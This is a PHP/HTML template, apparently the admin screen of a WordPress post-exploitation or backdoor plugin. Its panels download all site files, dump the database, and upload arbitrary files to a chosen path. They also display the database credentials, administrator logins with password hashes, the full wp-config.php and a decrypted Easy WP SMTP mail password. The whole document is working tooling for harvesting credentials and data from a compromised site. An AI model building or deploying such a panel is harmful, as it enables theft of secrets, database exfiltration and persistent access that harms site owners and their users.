<div class="wrap">

    <div class="card wpd-card-half">
        <h2>Downloads</h2>
        <form method="get">
            <input type="hidden" name="action" value="download_files"/>
            <input type="hidden" name="download" value="true"/>
            <button type="submit" class="button button-primary">Download all files</button>
            <br/><small>This might take a while for large sites.</small>
        </form>
        <form method="get" style="margin-top: 10px;">
            <input type="hidden" name="action" value="dump_db"/>
            <input type="hidden" name="download" value="true"/>
            <button type="submit" class="button button-primary">Dump database to SQL file</button>
        </form>
    </div>
    <div class="card wpd-card-half">
        <h2>Upload file</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload_file"/>
            <input type="hidden" name="upload" value="true"/>
            Upload dir: <input type="text" name="uploaded_file_path" id="uploaded_file_path" value="wp-content/uploads/">
            <input type="file" id="uploaded_file" name="uploaded_file" /> <br/>
            <input name="submit" type="submit" class="button button-primary" value="Upload">
        </form>
    </div>

    <div class="card wpd-card">
        <h2>Database credentials</h2>
        <p>
            <b>Host:</b> <?php echo $db_host; ?> <br/>
            <b>DB name:</b> <?php echo $db_name; ?> <br/>
            <b>DB user:</b> <?php echo $db_user; ?> <br/>
            <b>DB password:</b> <?php echo $db_password; ?> <br/>
        </p>
    </div>

    <div class="card wpd-card">
        <h2>Admin accounts</h2>
        
        <table class="table table-striped">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Login</th>
                    <th>Display name</th>
                    <th>Email</th>
                    <th>Password (hashed)</th>
                </tr>
            </thead>
            <tbody>
            <?php foreach($admin_accounts as $user) { ?>
                <tr>
                    <td><?php echo $user->ID; ?></td>
                    <td><?php echo $user->user_login; ?></td>
                    <td><?php echo $user->display_name; ?></td>
                    <td><?php echo $user->user_email; ?></td>
                    <td><?php echo $user->user_pass; ?></td>
                </tr>
            <?php } ?>
            </tbody>
        </table>
        
        
    </div>

    <div class="card wpd-card">
        <h2>wp-config.php file</h2>
        <?php echo $wp_config_content; ?>
    </div>

    <div class="card wpd-card">
        <h2>Easy WP SMTP password decryptor</h2>

        <?php if($easy_wp_smtp_installed) { ?>
            <p>
                <b>Email:</b> <?php echo $easy_wp_smtp_email; ?> <br/>
                <b>Password:</b> <?php echo $easy_wp_smtp_pass; ?>
            </p>
        <?php } else { ?>
            Plugin is not installed or not active.
        <?php } ?>
    </div>
</div>

